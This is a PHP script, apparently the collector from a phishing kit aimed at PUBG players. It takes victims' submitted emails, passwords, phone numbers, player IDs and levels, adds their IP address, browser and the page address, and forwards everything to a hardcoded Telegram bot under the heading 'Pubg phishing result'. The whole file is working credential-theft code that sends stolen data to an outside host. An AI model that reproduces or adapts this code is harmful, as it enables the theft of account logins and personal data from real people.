

<?php

//MENERIMA DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$nickname = $_POST['nickname'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpt = $_POST['rpt'];
$rpl = $_POST['rpl'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$pk = $_SERVER['HTTP_HOST'];
 $uls= $_SERVER['REQUEST_URI'];
// MENGAMBIL DATA KODE PANGGILAN NEGARA 
$callingcode = $arpantek_callingcode['country_code'];


 $ip =$_SERVER['REMOTE_ADDR']
;$apiToken = "928981818:AAFALjaRSHS8gKHfT_ZA_-fI0CVqiYs8lcc";
$chat = "1116624581";
$data = [
    'chat_id' => $chat,
    'text' => "⎈⊚-----------------------------------⊚⎈
☬ Pubg phishing result ☬

• Login : $login
• User   : $email
• Pass  : $password
• TellU  : $phone
 ⍟ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⍟
• PlayID: $playid
• Level  : $level
• rpl       : $rpl
 ⍟ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⋯ ⍟
• IP        : $ip
• Time   : $jamasuk
• Device: $ua
• From   : $pk$uls
By : @mrxsc

⎈⊚-----------------------------------⊚⎈"];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


?>
	
